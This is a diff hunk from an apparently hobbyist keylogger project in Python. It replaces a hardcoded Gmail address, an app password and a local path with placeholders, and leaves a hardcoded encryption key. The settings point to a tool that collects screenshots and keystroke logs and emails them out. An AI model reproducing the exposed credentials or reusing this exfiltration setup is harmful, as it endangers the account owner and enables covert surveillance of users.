@@ -42,16 +42,16 @@ screenshot_information = "ss.png"
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "harshitkumar10024@gmail.com"
-password = "uequxcdcdfueiqvx"
+email_address = "enter mail here"
+password = "enter password"
 
 username = getpass.getuser()
 
-toaddr = "harshitkumar10024@gmail.com"
+toaddr = "enter mail here"
 
 key = "HK6R8PL5yhXhD1RnxBrwibnS7atZWQCfSevWNQ33BOs="
 
-file_path = "C:\\Users\\Harshit\\PycharmProjects\\Keylogger\\Project"
+file_path = "enter file path here"
 extend = "\\"
 file_merge = file_path + extend
 
